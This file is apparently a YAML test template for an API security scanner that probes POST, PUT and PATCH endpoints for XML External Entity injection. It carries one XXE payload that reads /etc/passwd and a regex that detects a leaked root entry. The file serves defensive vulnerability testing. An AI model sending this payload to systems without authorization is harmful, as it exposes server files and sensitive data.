id: SIMPLE_XXE_INJECTION
info:
  name: "Basic XML External Entity (XXE) Vulnerability test in API Endpoints"
  description: >
    "This test assesses the ability of the application to safely handle XML input, 
    specifically focusing on identifying and preventing unauthorized access to external entities or system files through XML parsing."
  details: >
    "This test aims to identify vulnerabilities where XML input could be exploited 
    to access or expose sensitive data via external entity references."
  impact: >
    "Successful exploitation of XXE vulnerabilities could lead to sensitive data disclosure, server-side request forgery, or internal system probing, posing significant security risks."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: SIMPLE_XXE_INJECTION
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
    - "https://www.akto.io/blog/xml-external-entity-attack"
    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
  cwe:
    - CWE-611
    - CWE-827
  cve:
    - CVE-2022-42745

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  method:
    contains_either:
      - POST
      - PUT
      - PATCH
  request_payload:
    for_one:
      key:
        regex: .*
        extract: changed_body_key
      value:
        extract: changed_body_value
wordLists:
  payloads:
    - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
execute:
  type: single
  requests:
    - req:
        - modify_body_param: 
            changed_body_key:  ${payloads}
validate:
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - Attention Required!
      - CloudFlare
      - Sorry, you have been blocked
    regex: "root:.*:0:0:"
    not_contains:
      - <html>
      - </html>